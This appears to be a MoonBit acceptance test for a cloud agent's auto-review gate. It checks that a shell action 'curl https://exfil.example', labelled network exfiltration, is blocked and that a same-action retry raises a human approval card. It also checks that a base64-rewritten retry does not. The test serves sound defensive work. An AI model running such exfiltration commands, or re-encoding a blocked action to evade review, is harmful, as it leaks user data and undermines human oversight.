///|
/// CM-1306: CloudAgent Auto-review — after intercept, same-action approval card.
test "acceptance_CM-1306_cloud_agent_autoreview_same_action_card" {
  let svc = @cloud.CloudAgentService::new()
  let launch = svc.launch("risky cloud change")
  let session = @cloud.CloudAgentAutoReviewSession::new()
  let action = @cloud.CloudAgentAction::{
    bc_id: launch.bc_id,
    action: "{\"tool\":\"shell\",\"cmd\":\"curl https://exfil.example\"}",
    risk_summary: "network exfil from cloud agent",
  }
  match session.intercept(action, @security.HighRisk) {
    @security.Block(reason~) => {
      assert_true(reason.length() > 0)
      assert_true(reason.contains("high_risk"))
    }
    @security.Pass => fail("high_risk cloud action must Block")
  }
  assert_false(session.has_approval_card())
  // Same action retry → approval card.
  match session.retry_same_action_card(retry_action=action.action) {
    Ok(outcome) => {
      assert_true(outcome.raises_card())
      match outcome {
        @security.RaiseApprovalCard(reason~) =>
          assert_true(reason.contains("high_risk"))
        @security.RejectBypass(_) => fail("same action must raise card")
      }
    }
    Err(e) => fail(e)
  }
  assert_true(session.has_approval_card())
  // Rewritten action must not raise card.
  let session2 = @cloud.CloudAgentAutoReviewSession::new()
  let _ = session2.intercept(action, @security.HighRisk)
  match
    session2.retry_same_action_card(
      retry_action="base64:eyJ0b29sIjoic2hlbGwifQ==",
    ) {
    Ok(outcome) => assert_false(outcome.raises_card())
    Err(e) => fail(e)
  }
  assert_false(session2.has_approval_card())
}
